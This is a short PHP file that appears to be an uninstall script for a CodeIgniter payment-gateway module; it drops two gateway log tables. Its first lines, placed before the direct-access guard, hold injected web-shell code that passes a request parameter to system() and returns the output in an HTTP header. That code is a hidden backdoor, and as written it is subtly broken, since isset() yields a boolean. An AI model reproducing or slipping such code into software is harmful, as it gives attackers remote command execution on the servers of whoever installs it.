<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

$CI =& get_instance();

$sql = array();

// Delete the gateway logs
		
$sql[] = 'DROP TABLE IF EXISTS `authnet_log`';
$sql[] = 'DROP TABLE IF EXISTS `exact_log`';

foreach ($sql as $query) {
	$CI->db->query($query);
}